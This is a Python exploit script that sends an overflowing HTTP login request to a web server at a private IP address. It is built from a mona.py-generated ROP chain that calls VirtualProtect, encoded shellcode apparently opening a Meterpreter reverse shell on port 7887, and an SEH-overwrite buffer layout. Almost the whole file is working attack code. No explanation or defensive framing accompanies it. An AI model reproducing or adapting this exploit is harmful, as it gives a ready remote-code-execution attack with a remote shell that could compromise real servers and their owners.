import socket
from struct import pack

host = "172.16.192.167"
port = 80

max_size = 5000
eax_offset = 4127
seh_offset = 4059
split = 2923

def create_rop_chain():
  # rop chain generated with mona.py - www.corelan.be
  rop_gadgets = [

	0x10015442,  # POP EAX # RETN [ImageLoad.dll]
    0xFFFFFDFF,  # Value of '-201'
    0x100231d1,  # NEG EAX # RETN [ImageLoad.dll]
  
    # Put EAX into EBX (other unneccessary stuff comes with this gadget as well...)
    0x1001da09,  # ADD EBX,EAX # MOV EAX,DWORD PTR SS:[ESP+C] # INC DWORD PTR DS:[EAX] # RETN

    0x10015442,  # POP EAX # RETN [ImageLoad.dll] 
    0x61c832d0,  # ptr to &VirtualProtect() [IAT sqlite3.dll]

    0x1001281a,  # ADD ESP,4 # RETN [ImageLoad.dll]
    0x61c73281,  # &Writable location [sqlite3.dll

    0x1002248c,  # MOV EAX,DWORD PTR DS:[EAX] # RETN [ImageLoad.dll] 
    0x61c0a798,  # XCHG EAX,EDI # RETN [sqlite3.dll] 
    0x1001e5a0,  # POP ESI # RETN [ImageLoad.dll] 
    0xffffffff,  #  
    0x1001715d,  # INC ESI # ADD AL,3A # RETN [ImageLoad.dll] 
    0x10021a3e,  # ADD ESI,EDI # RETN 0x00 [ImageLoad.dll] 
    0x1001c1c8,  # POP EBP # RETN [ImageLoad.dll] 
    0x61c24169,  # & push esp # ret  [sqlite3.dll]
    0x10022c4c,  # XOR EDX,EDX # RETN [ImageLoad.dll] 
    0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
    0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
    0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
    0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
    0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
    0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
    0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
    0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
    0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
    0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
    0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
    0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
    0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
    0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
    0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
    0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
    0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
    0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
    0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
    0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
    0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
    0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
    0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
    0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
    0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
    0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
    0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
    0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
    0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
    0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
    0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
    0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
    0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
    0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
    0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
    0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
    0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
    0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
    0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
    0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
    0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
    0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
    0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
    0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
    0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
    0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
    0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
    0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
    0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
    0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
    0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
    0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
    0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
    0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
    0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
    0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
    0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
    0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
    0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
    0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
    0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
    0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
    0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
    0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
    0x1001bd98,  # POP ECX # RETN [ImageLoad.dll] 
    0x61c80fe1,  # &Writable location [sqlite3.dll]
    0x10019fbc,  # POP EDI # RETN [ImageLoad.dll] 
    0x10021058,  # RETN (ROP NOP) [ImageLoad.dll]
    0x10015442,  # POP EAX # RETN [ImageLoad.dll] 
    0x90909090,  # nop
    0x100240c2,  # PUSHAD # RETN [ImageLoad.dll] 
  ]
  return ''.join(pack('<I', _) for _ in rop_gadgets)

rev_met_7887  = "\xba\xb5\x50\x32\x63\xda\xdb\xd9\x74\x24\xf4"
rev_met_7887 += "\x5e\x33\xc9\xb1\x56\x31\x56\x13\x03\x56\x13"
rev_met_7887 += "\x83\xee\x49\xb2\xc7\x9f\x59\xb1\x28\x60\x99"
rev_met_7887 += "\xd6\xa1\x85\xa8\xd6\xd6\xce\x9a\xe6\x9d\x83"
rev_met_7887 += "\x16\x8c\xf0\x37\xad\xe0\xdc\x38\x06\x4e\x3b"
rev_met_7887 += "\x76\x97\xe3\x7f\x19\x1b\xfe\x53\xf9\x22\x31"
rev_met_7887 += "\xa6\xf8\x63\x2c\x4b\xa8\x3c\x3a\xfe\x5d\x49"
rev_met_7887 += "\x76\xc3\xd6\x01\x96\x43\x0a\xd1\x99\x62\x9d"
rev_met_7887 += "\x6a\xc0\xa4\x1f\xbf\x78\xed\x07\xdc\x45\xa7"
rev_met_7887 += "\xbc\x16\x31\x36\x15\x67\xba\x95\x58\x48\x49"
rev_met_7887 += "\xe7\x9d\x6e\xb2\x92\xd7\x8d\x4f\xa5\x23\xec"
rev_met_7887 += "\x8b\x20\xb0\x56\x5f\x92\x1c\x67\x8c\x45\xd6"
rev_met_7887 += "\x6b\x79\x01\xb0\x6f\x7c\xc6\xca\x8b\xf5\xe9"
rev_met_7887 += "\x1c\x1a\x4d\xce\xb8\x47\x15\x6f\x98\x2d\xf8"
rev_met_7887 += "\x90\xfa\x8e\xa5\x34\x70\x22\xb1\x44\xdb\x2a"
rev_met_7887 += "\x76\x65\xe4\xaa\x10\xfe\x97\x98\xbf\x54\x30"
rev_met_7887 += "\x90\x48\x73\xc7\xa1\x5f\x84\x17\x09\x0f\x7a"
rev_met_7887 += "\x98\x69\x19\xb9\xcc\x39\x31\x68\x6d\xd2\xc1"
rev_met_7887 += "\x95\xb8\x4e\xc8\x01\xef\x9e\x0c\x3b\x87\x9c"
rev_met_7887 += "\x8c\xa2\x97\x29\x6a\x8a\x77\x79\x23\x6b\x28"
rev_met_7887 += "\x39\x93\x03\x22\xb6\xcc\x34\x4d\x1d\x65\xde"
rev_met_7887 += "\xa2\xcb\xdd\x77\x5a\x56\x95\xe6\xa3\x4d\xd3"
rev_met_7887 += "\x29\x2f\x67\x23\xe7\xd8\x02\x37\x10\xbf\xec"
rev_met_7887 += "\xc7\xe1\x2a\xec\xad\xe5\xfc\xbb\x59\xe4\xd9"
rev_met_7887 += "\x8b\xc5\x17\x0c\x88\x02\xe7\xd1\xb8\x79\xde"
rev_met_7887 += "\x47\x84\x15\x1f\x88\x04\xe6\x49\xc2\x04\x8e"
rev_met_7887 += "\x2d\xb6\x57\xab\x31\x63\xc4\x60\xa4\x8c\xbc"
rev_met_7887 += "\xd5\x6f\xe5\x42\x03\x47\xaa\xbd\x66\xdb\xad"
rev_met_7887 += "\x41\xf4\xf4\x15\x29\x06\x45\xa6\xa9\x6c\x45"
rev_met_7887 += "\xf6\xc1\x7b\x6a\xf9\x21\x83\xa1\x52\x29\x0e"
rev_met_7887 += "\x24\x10\xc8\x0f\x6d\xf4\x54\x0f\x82\x2d\x67"
rev_met_7887 += "\x6a\xeb\xd2\x88\x8b\xe5\xb6\x89\x8b\x09\xc9"
rev_met_7887 += "\xb6\x5d\x30\xbf\xf9\x5d\x07\xb0\x4c\xc3\x2e"
rev_met_7887 += "\x5b\xae\x57\x30\x4e"

# BAD CHAR'S '\x00\x25\x26\x27\x2b'
payload  = "A" * split
payload += create_rop_chain()
payload += "\x90" * 20
payload += rev_met_7887	
payload += "B" * (seh_offset - len(payload))
payload += "DEAD"
payload += pack("<L", 0x1002280a)
payload += "A" * (eax_offset - len(payload))
payload += "DDDD"
payload += "A" * (max_size - len(payload))

request  = "GET / HTTP/1.1\r\n"
request += "Host: 172.16.192.177\r\n"
request += "Mozilla/5.0 (X11 Linux x86_64 rv:60.0 Gecko/20100101 Firefox/60.0\r\n"
request += "Accept: text/html,application/xhtml+xml,application/xmlq=0.9,*/*q=0.8\r\n"
request += "Accept-Language: enq=0.5\r\n"
request += "Accept-Encoding: gzip, deflate\r\n"
request += "Referer: http://172.16.192.167/\r\n"
request += "Content-type: application/x-www-form-urlencoded\r\n"
request += "Content-Length: 64\r\n"
request += "Cookie: SESSIONID=20557 UserID=admin PassWD=admin frmUserName= frmUserPass= rememberPass=202%2C197%2C208%2C215%2C201\r\n"
request += "Connection: close\r\n"
request += "\r\n"
request += "\r\n"
request += "frmLogin=true&frmUserName=" + payload +"&frmUserPass=admin&login=Login%21"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
s.send(request)
